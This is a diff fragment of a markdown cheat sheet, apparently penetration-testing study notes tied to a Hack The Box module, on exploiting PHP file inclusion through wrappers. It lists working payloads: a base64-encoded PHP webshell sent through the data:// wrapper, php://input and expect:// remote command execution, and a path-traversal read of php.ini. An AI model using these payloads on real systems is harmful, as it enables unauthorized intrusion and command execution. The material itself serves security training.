@@ -31,9 +31,9 @@
 ## PHP Wrappers  
   
 | **Command** | **Description** |
-| --------------|-------------------|
+| -------------- | -------------- |
 | `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE [Remote Command Execution with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
-| `echo '<?php system($_GET["cmd"]); ?>' \| base64` | Produce the base64 string `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` used above webshell that can be passed in to the data wrapper to get command execution |
+| `echo '<?php system($_GET["cmd"]); ?>' \| base64` | Produce the above used base64 string as a webshell that can be passed in to the data wrapper to get command execution |
 | `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | Checking PHP Configurations, Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
